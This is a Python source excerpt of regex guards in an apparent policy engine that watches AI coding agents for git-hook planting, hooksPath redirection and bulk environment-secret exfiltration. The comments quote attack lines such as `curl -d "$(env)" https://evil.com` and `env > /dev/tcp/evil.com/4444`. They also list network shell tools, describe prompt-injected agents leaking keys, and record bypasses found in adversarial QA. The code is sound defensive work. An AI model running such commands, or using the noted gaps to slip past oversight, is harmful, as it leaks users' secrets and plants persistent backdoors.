# false-positive on a commit message, echoed string, or comment containing the phrase
# "mcp add" — those never begin a command.
MCP_CLI_ADD_RE = re.compile(
    r"\b(?:claude|codex|cursor|windsurf|gemini)\b[^|;&\n]*\bmcp\b[^|;&\n]*\b(?:add|add-json|install)\b"
    r"|(?:^|[;&|\n]\s*)(?:sudo\s+)?mcp\s+add\b",
    re.IGNORECASE,
)

# No-execute *fetch* forms — pull artifacts WITHOUT installing/placing or running any
# package code. These don't trip the gate (a download is not an install). NOTE: this
# deliberately excludes ``npm install --ignore-scripts`` — that still PLACES the
# package on disk, whose top-level import code runs the moment it's required, so it is
# an install and stays gated.
NOEXEC_FETCH_RE = re.compile(
    r"\bpip3?\s+download\b"
    r"|\bnpm\s+pack\b",
    re.IGNORECASE,
)

# git hooks — scripts under .git/hooks/ (or a checked-in convention dir a repo
# points core.hooksPath at: .githooks/, .husky/) run AUTOMATICALLY and
# UNATTENDED on ordinary git operations (commit/push/checkout/merge/rebase/
# receive) for every future invocation in this repo — the planting agent's own
# later commands, a human teammate who pulls/clones and runs git normally, and
# CI. Same durable, cross-session-backdoor shape MCP_CONFIG_PATH_RE guards for
# MCP servers, but for git, and currently unguarded: nothing in this codebase
# checked hook paths before this pattern was added. `.husky/` is included
# because it is the dominant real-world convention (npm's `husky` package
# wires `core.hooksPath .husky` during `npm install`, so a repo that already
# uses it has hook execution already redirected there) — a write to any file
# under it is live immediately, no config change required.
GIT_HOOKS_DIR_RE = re.compile(
    r"(?:^|[\s'\"/\\=])\.git" + _WIN_TRIM + _SEP + r"hooks" + _WIN_TRIM + _SEP + r"[\w.-]+"
    r"|(?:^|[\s'\"/\\=])\.githooks" + _WIN_TRIM + _SEP + r"[\w.-]+"
    r"|(?:^|[\s'\"/\\=])\.husky" + _WIN_TRIM + _SEP + r"[\w.-]+",
    re.IGNORECASE,
)

# git's own config file, targeted DIRECTLY — local (.git/config) and global
# (~/.gitconfig, ~/.config/git/config). A write here can plant `core.hooksPath`
# (or any other setting) without ever invoking the `git config` subcommand the
# pattern below watches, e.g. an Edit/Write tool call, or a shell redirect/
# in-place-edit straight at the file.
GIT_CONFIG_FILE_RE = re.compile(
    r"(?:^|[\s'\"/\\=])\.git" + _WIN_TRIM + _SEP + r"config\b"
    r"|(?:^|[\s'\"/\\=])\.gitconfig\b"
    r"|(?:^|[\s'\"/\\=])\.config" + _WIN_TRIM + _SEP + r"git" + _WIN_TRIM + _SEP + r"config\b",
    re.IGNORECASE,
)

# `git config core.hooksPath <value>` (local/--global/--system) or inline
# `git -c core.hooksPath=<value> ...` — redirects hook execution to an
# ARBITRARY directory without ever touching .git/hooks or .git/config as a
# literal path, so neither pattern above can see it; a script already sitting
# anywhere on disk (even disguised as a data file) becomes "the pre-commit
# hook" the moment this lands. Requires a trailing VALUE token (not just the
# key name) so a read (`--get core.hooksPath`) or an `--unset` (which takes no
# value and restores the default) — both harmless — don't false-positive.
#
# Deliberately does NOT exclude a value starting with `--` (round-1 adversarial
# QA, independent agent): an earlier draft had a `(?!--)` guard meant to stop a
# stray flag from being misread as a value, but that let `git config
# core.hooksPath -- /tmp/evil-hooks` sail straight through untouched (real
# git's own arg parsing for this form is exactly the sort of surprising corner
# a policy engine must fail SAFE on, not guess about) — the fix is to just
# treat any trailing token as a set, `--`-prefixed or not.
#
# The value char class excludes shell operators/whitespace (`--get
# core.hooksPath; rm -rf /` doesn't misread the following statement as a
# value) AND quote characters `'"^\x60` (round-1 QA also found the quote gap:
# `normalize.scan_surface`'s RAW-command copy keeps the command's own quoting
# intact, so a closing quote sitting immediately after the key in a perfectly
# ordinary quoted read — `git config --get "core.hooksPath"`, or that same
# read wrapped in `bash -c "..."` — was being read as if it were the value).
#
# The value must also not be a bare `git` -- scan_surface's de-obfuscation
# pass duplicates the whole (unquoted) command verbatim ("cmd cmd"), so a
# plain read like `git config --get core.hooksPath` would otherwise see its
# OWN duplicate as if it were a trailing value; a real hooks-path value is
# never literally the word "git".
GIT_HOOKS_PATH_CONFIG_RE = re.compile(
    r"\bgit\b[^|;&\n]*?\bconfig\b[^|;&\n]*?\bcore\.hooksPath\b\s*=?\s*(?!git\b)[^\s|;&\n'\"^`]"
    r"|\bgit\b[^|;&\n]*?\s-c\s*['\"]?core\.hooksPath\s*=\s*(?!git\b)[^\s|;&\n'\"^`]",
    re.IGNORECASE,
)

# `GIT_CONFIG_KEY_<n>=core.hooksPath` (paired with `GIT_CONFIG_VALUE_<n>=<dir>`
# and, conventionally, `GIT_CONFIG_COUNT=<n>`) — git's environment-variable
# config-injection mechanism (documented in git-config(1)) applies for every
# git invocation in the shell that sees these vars, exactly like `-c
# core.hooksPath=...` but via env assignment instead of a CLI flag, and
# GIT_HOOKS_PATH_CONFIG_RE's "git config ... core.hooksPath" / "git -c
# core.hooksPath=" shapes don't cover it at all (round-1 adversarial QA,
# independent agent — confirmed live against real git: `GIT_CONFIG_COUNT=1
# GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/tmp/evil git status`
# actually redirects hook execution). High-signal by construction: naming a
# GIT_CONFIG_KEY_N var's VALUE as exactly "core.hooksPath" has no legitimate
# reason to appear outside of this mechanism. Deliberately does not require
# GIT_CONFIG_VALUE_<n> in the same statement (it may be set in an earlier
# `export` the guard never sees) — declaring the KEY mapping alone is already
# the attack shape. The env VAR NAME half is scoped case-SENSITIVE (`(?-i:...)`)
# inside the otherwise case-insensitive pattern (round-2 QA, independent agent):
# shell env-var names are themselves case-sensitive, so `git_config_key_0=...`
# (lowercase) is inert to real git and must not false-positive just because the
# surrounding pattern is generally case-insensitive for readability elsewhere.
GIT_HOOKS_ENV_CONFIG_RE = re.compile(
    r"\b(?-i:GIT_CONFIG_KEY_)\d+\s*=\s*['\"]?core\.hooksPath\b",
    re.IGNORECASE,
)

# Marking a planted hook file executable — the one extra step some write paths
# (a plain Write/Edit tool call) leave undone, since git only runs a hook that
# already has its executable bit set. Narrow to the common symbolic +x form;
# an octal mode (`chmod 755 ...`) is a documented, deliberate gap in the same
# spirit as this file's other residual-gap notes.
CHMOD_EXEC_RE = re.compile(r"\bchmod\b[^|;&\n]*\+x\b", re.IGNORECASE)

# Environment-variable secret exfiltration. An agentic session's process
# environment routinely holds decrypted, ready-to-use secrets — the model
# provider's own API key, GITHUB_TOKEN, cloud credentials, DATABASE_URL,
# webhook/deploy tokens — already loaded, with no credential FILE (CRED_RE) or
# local FILE (EXFIL_RE) needing to be touched at all. A prompt-injected agent
# (a malicious repo's setup notes, a fetched web page, a poisoned dependency)
# can hand every one of them to an attacker in a single shell line by dumping
# the environment and piping/substituting it straight into a network tool — a
# shape none of the file-oriented guards above recognize: EXFIL_RE requires an
# '@file'/'--upload-file'/a remote scp/rsync target, so a bare
# `curl -d "$(env)" https://evil.com` (no '@', no remote host argument) sails
# straight through it.
#
# Scope: the BULK dump -> network-sink shape only (`env | curl`,
# `curl -d "$(env)" url`, PowerShell `Get-ChildItem Env: | Invoke-RestMethod`,
# `.NET [Environment]::GetEnvironmentVariables()` piped to a fetch tool, plus a
# narrow python/node inline-one-liner case below). No legitimate workflow
# pipes or substitutes a FULL environment dump into a network call, so this is
# high-precision by construction. Deliberately does NOT flag a single named
# variable (e.g.
# `curl -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/...`)
# — that is the ordinary, sanctioned way an agent authenticates to a service
# with its OWN credential, and there is no reliable name -> host legitimacy
# table to tell "the vendor's own API" from "an attacker's host" by regex
# alone; guessing wrong there would be a severe false-positive source (every
# authenticated API call an agent legitimately makes) for an ambiguous benefit.
# That narrower single-variable case is a documented, deliberate gap — same
# spirit as this file's other residual-gap notes — with deny-by-default
# egress (policy-driven) as the backstop for a genuinely attacker-controlled
# destination. Independent adversarial QA (round 1) also flagged, and this
# guard now fixes, two false-positive root causes that fell out of the SAME
# single-variable principle: `printenv VAR`/`Get-ChildItem Env:VAR` reading
# exactly one named variable (e.g. `printenv DEPLOY_WEBHOOK_URL | xargs curl`
# to trigger a deploy webhook) were being treated as a dump because only
# `env`'s bare-vs-prefix distinction was checked, not printenv/Get-ChildItem's
# identical bare-vs-named-argument one; separately, a bare `\benv\b` with no
# command-position anchor matched the literal substring "env" inside an
# unrelated URL path (e.g. a Spring Boot Actuator `/debug/env` diagnostics
# endpoint chained into a second, unrelated curl) as if it were the dump
# primitive. Every alternative below is now anchored to `_CMD_START` (start of
# string, or right after a real separator — never inside a URL/argument word)
# and, where a named-argument form exists, restricted to the BARE (no
# trailing variable name) invocation, matching how `env` already worked.
#
# `env` needs one more wrinkle beyond that: `env FOO=bar cmd args...` does NOT
# dump — it runs `cmd` with a modified environment, and pipes/network calls
# after it operate on cmd's OUTPUT (e.g. `env NODE_ENV=production npm run
# build | curl -d @- https://logs.example.com`, a completely ordinary
# log-shipping one-liner). Only bare `env`, or `env` followed solely by
# flags/`NAME=value` assignments with no trailing command word, actually
# dumps (true per POSIX: `env` with no utility argument prints the resulting
# environment). The lookahead enforces exactly that: zero or more
# flag/assignment tokens, then immediately a pipe/separator/end — a bare word
# breaks it. The terminator set includes `>` too (not just `|`/`;`/`&`/
# newline/end) so bash's `/dev/tcp` pseudo-device redirect — `env >
# /dev/tcp/evil.com/4444`, a real socket with no external binary at all —
# still counts as terminating a bare dump instead of being read as a trailing
# command-word argument.
#
# Sinks (`_NET_SINK`) cover the usual HTTP/PowerShell fetch tools plus the
# raw-socket/legacy-protocol tools an independent adversarial-bypass QA round
# demonstrated were live gaps: socat, openssl s_client, ssh (piping a dump
# into a remote shell — same "push local secrets to any remote host" concern
# EXFIL_RE's scp/rsync check already treats as exfiltration regardless of
# whose host it is), ftp, telnet. `_DEV_NET` catches the `/dev/tcp`|`/dev/udp`
# bash-native socket shape even when no external sink binary appears at all.
# Not exhaustive: further exotic transports (raw compiled binaries, DNS
# tunneling, other languages' one-off socket libraries) are the same
# documented-gap posture as every other pattern in this file; deny-by-default
# egress is the backstop.
#
# Dump primitives also grew two bash builtins found missing in the same QA
# round — `set` (bare; dumps shell vars+functions, a superset of the
# environment) and `declare -x` (bare; dumps exported vars) — plus PowerShell
# aliases/equivalents (`ls env:`, `Get-Item Env:*` — the trailing `*` keeps
# this the BULK form, since `Get-Item Env:NAME` with no wildcard returns only
# that one variable and is deliberately still allowed) and the fully-qualified
# `[System.Environment]::GetEnvironmentVariables()` spelling real PowerShell
# scripts commonly use alongside the short `[Environment]::` form already
# covered. Deliberately excluded: `compgen -e` (bash completion builtin that
# lists variable NAMES only, not values — a much weaker signal, and a
# legitimate shell-completion/tooling command in its own right) — a
# documented, deliberate gap in the same spirit as the single-named-variable
# one above.
#
# The final two alternatives close a narrow but real gap the same QA round
# demonstrated: an inline `python3 -c "..."`/`node -e "..."` one-liner whose
# code both reads the bulk environment (`os.environ`, `process.env`) AND
# makes an HTTP call (`requests.post`, `fetch(`, ...) never contains any of
# the `_NET_SINK` words as literal shell tokens, so the first alternative
# can't see it — but `normalize.scan_surface` already extracts and re-scans a
# `-c`/`-e` interpreter's inner code (see `_INTERP_RES` there), so the literal
# text IS available to match against once both signals are required in the
# same unbroken statement, in either order. Deliberately narrow: this is NOT
# a general Python/JS network-call detector (see EXFIL_RE's own docstring:
# "an in-process python requests.post can't be pattern-matched" in general —
# a SAVED script file's contents are not scanned by this shell-only guard at
# all) — it only fires when BOTH a bulk-env-access token and a network-call
# token appear together in one inline one-liner passed directly on the
# command line, which is a narrow, high-signal shape with little legitimate
# overlap (an ordinary one-liner does one thing, not two unrelated ones).
#
# Performance: every wildcard span below is a SINGLE, non-overlapping
# `[^...]*` between two fixed anchors — never two adjacent unbounded spans
# around the same repeatable character, which is what caused two distinct
# quadratic-or-worse blowups found and fixed during QA: (1) an early draft
# used two adjacent `[^;&\n]*` groups around an explicit literal `\|`, so a
# crafted ~59KB pipeline with many '|' characters and no eventual match took
# 4+ seconds (a non-escapable guard hanging is itself a bypass path — README:
# fail-OPEN if the hook can't complete); (2) the substitution-form
# alternative's wildcard originally allowed `$`/backtick/`<` through freely,
# so a crafted string with many `$(`/backtick/`<(` occurrences and no valid
# inner dump forced the engine to retry the trailing sub-pattern at every one
# of them (~1s at ~24KB). Both are fixed the same way: the wildcard's
# character class EXCLUDES the delimiter(s) it's searching for (`;`/`&`/
# newline always; additionally `$`/backtick/`<` in the substitution
# alternative), so the span can stop in exactly ONE place — the first
# candidate position — with no way for the engine to backtrack past a failed
# attempt to try a later one. The one deliberate, narrow exception is a
# SINGLE optional `<` + whitespace allowance (`(?:<\s+)?`) right before the
# real opener, added so `cmd < <(env)` — a real redirect operator immediately
# preceding a real process-substitution opener, an entirely ordinary way to
# write that shape in bash — still matches; it's a fixed-form, at-most-once
# allowance (not another unbounded span), so it adds no backtracking risk,
# at the cost of not seeing past a SECOND stray '<' before the real one (an
# unusual shape, and a documented, deliberate gap in the same spirit as the
# others above). All of the above is re-verified by a dedicated perf/ReDoS
# stress test in this file's test suite (crafted multi-KB adversarial inputs
# with no eventual match, timed, not just eyeballed).
_NET_SINK = (r"(?:curl|wget|nc|ncat|netcat|http|Invoke-WebRequest|Invoke-RestMethod|"
             r"iwr|irm|socat|telnet|ftp|ssh|openssl\s+s_client)")
_DEV_NET_RE_FRAG = r"/dev/(?:tcp|udp)/"
_SINK_OR_DEVNET = r"(?:\b" + _NET_SINK + r"\b|" + _DEV_NET_RE_FRAG + r")"

# start of string, or right after a real command separator (never inside a
# URL/path/argument word), optional 'sudo'.
_CMD_START = r"(?:^|[|;&\n]\s*)(?:sudo\s+)?"
_ENV_FLAGS = r"(?:-[iI0]\S*|--ignore-environment|--null|-u\s*\S+|--unset=\S+|-C\s*\S+)"
_ENV_DUMP_TERM = r"(?:[|;&>\n]|$)"  # '>' -> `env >/dev/tcp/...` still terminates the bare-dump check

_ENV_BARE = (
    _CMD_START + r"env\b(?=(?:\s+(?:" + _ENV_FLAGS + r"|[A-Za-z_][A-Za-z0-9_]*=\S*))*"
    r"\s*" + _ENV_DUMP_TERM + r")"
)
_PRINTENV_BARE = (_CMD_START + r"printenv\b(?=(?:\s+" + _ENV_FLAGS + r")*\s*"
                   + _ENV_DUMP_TERM + r")")
_EXPORT_P_BARE = _CMD_START + r"export\s+-p\b(?=\s*" + _ENV_DUMP_TERM + r")"
_DECLARE_X_BARE = _CMD_START + r"declare\s+-x\b(?=\s*" + _ENV_DUMP_TERM + r")"
_SET_BARE = _CMD_START + r"set\b(?=\s*" + _ENV_DUMP_TERM + r")"
_PS_ENV_DRIVE_BARE = (
    _CMD_START + r"(?:Get-ChildItem\s+|(?:gci|dir|ls)\s+)[Ee]nv:\\?"
    r"(?=\s*" + _ENV_DUMP_TERM + r")"
)
_PS_GETITEM_BARE = _CMD_START + r"Get-Item\s+[Ee]nv:\\?\*(?=\s*" + _ENV_DUMP_TERM + r")"
_DOTNET_GETENV = _CMD_START + r"\[(?:System\.)?Environment\]::GetEnvironmentVariables\s*\("

_ENV_DUMP_ALT = (
    r"(?:" + _ENV_BARE + r"|" + _PRINTENV_BARE + r"|" + _EXPORT_P_BARE
    + r"|" + _DECLARE_X_BARE + r"|" + _SET_BARE
    + r"|" + _PS_ENV_DRIVE_BARE + r"|" + _PS_GETITEM_BARE
    + r"|" + _DOTNET_GETENV + r")"
)

# substitution-form inner dump: same bare-only restriction as above, checked
# right after the opening '$('/backtick/'<(' rather than at command-start.
_SUB_ENV = r"env(?:\s+" + _ENV_FLAGS + r")*"
_SUB_PRINTENV = r"printenv(?:\s+" + _ENV_FLAGS + r")*"
_SUB_EXPORT_P = r"export\s+-p"
_SUB_DECLARE_X = r"declare\s+-x"
_SUB_SET = r"set"
_SUB_PS_ENV_DRIVE = r"(?:Get-ChildItem\s+|(?:gci|dir|ls)\s+)[Ee]nv:\\?"
_SUB_INNER = (
    r"(?:" + _SUB_ENV + r"|" + _SUB_PRINTENV + r"|" + _SUB_EXPORT_P + r"|"
    + _SUB_DECLARE_X + r"|" + _SUB_SET + r"|" + _SUB_PS_ENV_DRIVE + r")[^)`]*"
)

# python/node inline one-liner: bulk env access + a network call, either
# order, in one unbroken statement (see design note above).
_SCRIPT_ENV = r"(?:os\.environ|process\.env)\b"
_SCRIPT_NET = r"(?:requests\.(?:post|put|get|patch)|urlopen|fetch|axios\.\w+|http\.client)\s*\("

ENV_DUMP_EXFIL_RE = re.compile(
    _ENV_DUMP_ALT + r"[^;&\n]*" + _SINK_OR_DEVNET
    + r"|" + _NET_SINK + r"\b[^;&\n$`<]*(?:<\s+)?(?:\$\(|`|<\()\s*" + _SUB_INNER + r"\s*[)`]"
    + r"|" + _SCRIPT_ENV + r"[^;&\n]*" + _SCRIPT_NET
    + r"|" + _SCRIPT_NET + r"[^;&\n]*" + _SCRIPT_ENV,
    re.IGNORECASE,
)

# A test-suite invocation, across common toolchains. Backs the opt-in Stop
# verification gate (lifecycle.session.rule_stop_verification_gate): evidence
# that a test run HAPPENED after the last change — presence of the command, not
# a parse of its pass/fail output. Policy can supply its own regexes instead
# (``completion.patterns``).
TEST_CMD_RE = re.compile(
    r"\bpytest\b|\bpython3?\s+-m\s+(?:pytest|unittest)\b|\btox\b|\bnox\b"
    r"|\bnpm\s+(?:run\s+)?test\b|\byarn\s+test\b|\bpnpm\s+(?:run\s+)?test\b"
    r"|\bnpx\s+(?:jest|vitest|mocha|playwright|ava)\b|\bjest\b|\bvitest\b|\bmocha\b"
    r"|\bcargo\s+test\b|\bgo\s+test\b|\bdotnet\s+test\b|\bctest\b"
    r"|\bmvn\b[^|;&\n]*\b(?:test|verify)\b|\bgradlew?\b[^|;&\n]*\btest\b"
    r"|\brake\s+test\b|\brspec\b|\bphpunit\b|\bmix\s+test\b",
    re.IGNORECASE,
)
